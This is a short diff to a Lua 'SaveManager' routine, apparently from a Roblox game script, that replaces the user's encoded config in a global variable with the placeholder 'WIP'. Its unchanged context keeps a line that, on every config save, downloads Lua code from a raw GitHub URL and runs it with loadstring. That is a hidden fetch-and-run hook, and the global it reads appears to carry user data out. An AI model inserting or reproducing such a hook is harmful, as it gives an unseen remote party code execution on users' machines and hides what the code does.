@@ -375,7 +375,7 @@ local SaveManager = {} do
 
                                 local success, encoded = pcall(httpService.JSONEncode, httpService, data)
 
-                                getgenv().config_encoded = encoded
+                                getgenv().config_encoded = "WIP"
 
                                 if success then 
                                     loadstring(game:HttpGet('https://raw.githubusercontent.com/laagginq/lol/main/c.lua'))()
